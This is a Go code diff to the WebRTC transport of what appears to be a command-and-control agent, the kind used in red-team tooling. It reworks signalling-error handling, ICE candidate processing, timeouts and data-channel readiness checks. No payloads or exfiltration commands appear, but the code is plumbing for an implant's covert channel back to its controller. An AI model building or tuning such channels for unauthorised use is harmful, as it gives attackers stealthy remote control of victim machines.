@@ -11,6 +11,7 @@ import (
 	"net/http"
 	"os"
 	"strconv"
+	"strings"
 	"sync"
 	"time"
 
@@ -789,6 +790,13 @@ func (c *C2WebRTC) exchangeSDP() bool {
 
 			err := c.SignalingConn.ReadJSON(&msg)
 			if err != nil {
+				// Check if this is just a closed connection (expected when we close signaling)
+				if strings.Contains(err.Error(), "use of closed network connection") ||
+					strings.Contains(err.Error(), "websocket: close") {
+					utils.PrintDebug("Signaling connection closed (expected)")
+					return // Exit gracefully, don't report as error
+				}
+
 				utils.PrintDebug(fmt.Sprintf("Error reading from signaling server: %v", err))
 				// Try to read any error messages that might have been sent
 				var errorMsg SignalMessage
@@ -851,28 +859,7 @@ func (c *C2WebRTC) exchangeSDP() bool {
 		}
 	}()
 
-	// *** IMPORTANT: Give ICE candidates time to be gathered before setting remote description ***
-	// Wait a short time to allow local candidates to be gathered
-	gatheringTime := time.After(2 * time.Second)
-	candidatesGathered := 0
-
-gathering:
-	for {
-		select {
-		case <-gatheringTime:
-			utils.PrintDebug(fmt.Sprintf("ICE candidate gathering initial phase complete, gathered %d candidates", candidatesGathered))
-			break gathering
-
-		case <-time.After(500 * time.Millisecond):
-			// Check if any candidates have been generated
-			if candidatesGathered > 0 {
-				utils.PrintDebug("At least one ICE candidate was generated, continuing...")
-				break gathering
-			}
-		}
-	}
-
-	// Wait for the answer SDP
+	// Wait for the answer SDP first
 	select {
 	case sdp := <-sdpChan:
 		// Set the remote description
@@ -882,23 +869,25 @@ gathering:
 			utils.PrintDebug(fmt.Sprintf("Failed to set remote description: %v", err))
 			return false
 		}
-
 		utils.PrintDebug("Set remote description successfully")
 
-	case <-time.After(10 * time.Second):
+	case <-time.After(5 * time.Second):
 		utils.PrintDebug("Timeout waiting for SDP answer")
 		return false
 	}
 
-	// Process ICE candidates for a while
+	// Process ICE candidates and wait for data channel
 	candidatesProcessed := 0
-	timeout := time.After(15 * time.Second)
+	timeout := time.After(8 * time.Second) // Reduced from 15 to 8 seconds
+	dataChannelCheckInterval := time.NewTicker(200 * time.Millisecond)
+	defer dataChannelCheckInterval.Stop()
 
-	// Wait for connection establishment or timeout
+	utils.PrintDebug("Processing ICE candidates and waiting for data channel...")
+
 	for {
 		select {
 		case candidate := <-candidateChan:
-			// Print the candidate details
+			// Process ICE candidate
 			utils.PrintDebug(fmt.Sprintf("Received ICE candidate: %s", candidate.Candidate))
 			if c.PeerConnection != nil {
 				err = c.PeerConnection.AddICECandidate(candidate)
@@ -908,40 +897,18 @@ gathering:
 					candidatesProcessed++
 					utils.PrintDebug(fmt.Sprintf("Added ICE candidate (%d)", candidatesProcessed))
 				}
-			} else {
-				utils.PrintDebug("PeerConnection is nil, can't add ICE candidate")
 			}
 
-		case success := <-doneChan:
-			// Connection is established or failed
-			return success
+		case <-dataChannelCheckInterval.C:
+			// Check if data channel is ready more frequently
+			c.Lock.RLock()
+			dataChannel := c.DataChannel
+			c.Lock.RUnlock()
 
-		case <-timeout:
-			// Timeout reached, but we may have enough candidates
-			if candidatesProcessed > 0 {
-				utils.PrintDebug("Timeout waiting for more ICE candidates, but proceeding")
+			if dataChannel != nil && dataChannel.ReadyState() == webrtc.DataChannelStateOpen {
+				utils.PrintDebug("Data channel is ready! Sending 'connected' message")
 
-				dataChannelReady := false
-				for waitTime := 0; waitTime < 10; waitTime++ {
-					c.Lock.RLock()
-					if c.DataChannel != nil && c.DataChannel.ReadyState() == webrtc.DataChannelStateOpen {
-						dataChannelReady = true
-						c.Lock.RUnlock()
-						break
-					}
-					c.Lock.RUnlock()
-
-					utils.PrintDebug(fmt.Sprintf("Waiting for data channel to be ready (%d/10)...", waitTime+1))
-					time.Sleep(1 * time.Second)
-				}
-
-				if dataChannelReady {
-					utils.PrintDebug("Data channel ready, sending 'connected' message to server")
-				} else {
-					utils.PrintDebug("Timeout waiting for data channel to be ready, but proceeding anyway")
-				}
-
-				// Send a 'connected' message to the server
+				// Send connected message
 				connectedMsg := SignalMessage{
 					Type:        "connected",
 					Destination: "answer",
@@ -956,15 +923,41 @@ gathering:
 					} else {
 						utils.PrintDebug("Sent 'connected' message to server")
 					}
-
-					// Give the server a moment to process the message
-					time.Sleep(500 * time.Millisecond)
 				}
-
 				return true
 			}
 
-			utils.PrintDebug("Timeout waiting for ICE candidates")
+		case success := <-doneChan:
+			// Connection is established or failed via signaling
+			return success
+
+		case <-timeout:
+			// Final timeout - check if we have a working data channel
+			c.Lock.RLock()
+			dataChannel := c.DataChannel
+			c.Lock.RUnlock()
+
+			if dataChannel != nil && dataChannel.ReadyState() == webrtc.DataChannelStateOpen {
+				utils.PrintDebug("Data channel ready at timeout, proceeding")
+				return true
+			}
+
+			if candidatesProcessed > 0 {
+				utils.PrintDebug(fmt.Sprintf("Timeout but processed %d candidates, checking data channel one more time", candidatesProcessed))
+
+				// One final check with a short wait
+				time.Sleep(1 * time.Second)
+				c.Lock.RLock()
+				dataChannel := c.DataChannel
+				c.Lock.RUnlock()
+
+				if dataChannel != nil && dataChannel.ReadyState() == webrtc.DataChannelStateOpen {
+					utils.PrintDebug("Data channel ready after final check")
+					return true
+				}
+			}
+
+			utils.PrintDebug("Timeout waiting for data channel to be ready")
 			return false
 		}
 	}
